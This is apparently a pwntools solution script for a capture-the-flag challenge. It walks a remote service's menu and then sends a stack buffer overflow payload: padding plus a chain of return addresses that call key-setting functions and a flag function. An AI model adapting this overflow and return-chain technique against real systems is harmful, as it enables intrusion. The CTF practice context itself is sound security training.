from pwn import *
#target=process('./challenge')
target=remote('challenges.auctf.com' ,30012)

print(target.recvuntil("choice: "))
target.sendline("\x32")
print(target.recvuntil("enter: "))
target.sendline("\x34")
print(target.recvuntil("choice: "))
target.sendline("\x33")
print(target.recvuntil("exit: "))
target.sendline("Stephen")
print(target.recvuntil("something: "))

getkey1=0x565566de
getkey3=0x565567cd
getkey2=0x5655676e
setkey4=0x565567e9
getflag=0x5655686b
popret=0x565567e7

payload="A"*28
payload+=p32(getkey3)
payload+=p32(getkey2)
payload+=p32(getkey1)
payload+=p32(popret)
payload+=p32(0xfeedc0de)
payload+=p32(setkey4)
payload+=p32(getflag)

target.sendline(payload)
target.interactive()


